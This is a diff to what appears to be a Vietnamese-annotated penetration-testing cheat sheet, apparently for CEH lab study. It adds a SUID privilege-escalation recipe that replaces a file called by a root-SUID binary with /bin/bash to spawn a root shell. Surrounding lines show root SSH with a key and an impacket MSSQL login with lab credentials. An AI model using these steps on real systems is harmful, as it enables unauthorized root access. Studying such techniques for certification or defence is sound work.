@@ -251,6 +251,19 @@ chmod 600 id_rsa
 ssh root@<ip address> -p 50706 -i id_rsa
 
 ----------------------------------------------------------------------------------------------------------------------
+[permissions] [links] [owner] [group] [size] [date] [name]
+stat -c "%a %A %U %G %F" <file>
+<file1> 							(file này chạy, có quyền root do SUID)
+<file2>								(file 1 sử dụng file 2 khi chạy)
+
+string <file1>						(kiểm tra có gọi file 2 không)
+rm <file2>
+cp /bin/bash <file2>				(nếu ko đc thì rm rồi cp lại, copy shell vào thư mục hiện tại với tên là file2
+									 
+./<file1>							(Từ đó chạy file 1 sẽ mở shell với quyền root vì lúc đầu file đó đã có quyền root)
+
+---------------------------------------------------------------------------------------------------------------------
+
 
 ```
 # SMB
@@ -272,5 +285,6 @@ Remmina Remote Desktop Client (On kali)
 python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
 nRAT
 Detect It Easy 								(Tính entropy)
+
 
 ```
